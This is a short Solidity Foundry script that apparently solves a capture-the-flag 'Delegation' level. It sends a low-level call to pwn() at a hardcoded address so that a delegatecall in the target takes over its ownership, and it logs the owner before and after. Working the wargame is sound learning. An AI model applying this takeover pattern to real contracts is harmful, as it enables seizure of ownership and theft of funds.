// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";

interface IDelegate {
    function owner() external view returns (address);

    function pwn() external;
}

contract DelegationSolution is Script {
    IDelegate badIdea =
        IDelegate(0x2Ed91eA4F815b5D50bB65472Cf14118C70399390);

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);

        console2.log("Current owner: ", badIdea.owner());
        (bool success, ) = address(badIdea).call(
            abi.encodeWithSignature("pwn()")
        );
        require(success, "Hack failed");
        console2.log("New owner: ", badIdea.owner());

        vm.stopBroadcast();
    }
}